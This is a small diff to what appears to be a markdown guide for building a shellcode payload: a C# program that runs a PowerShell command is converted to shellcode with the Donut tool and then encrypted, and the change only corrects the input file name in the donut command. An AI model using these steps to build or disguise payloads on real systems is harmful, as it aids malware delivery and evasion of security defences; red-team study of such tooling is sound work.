@@ -72,7 +72,7 @@ Create a file like `Executable_Generator.cs` that executes a PowerShell command 
 ### 3. Generate shellcode with Donut
 
 ```bash
-donut.exe -i ShellCode_Generator.exe -a 2 -f 1 -o shellcode.bin
+donut.exe -i Executable_Generator.exe -a 2 -f 1 -o shellcode.bin
 ```
 
 ### 4. Encrypt the shellcode
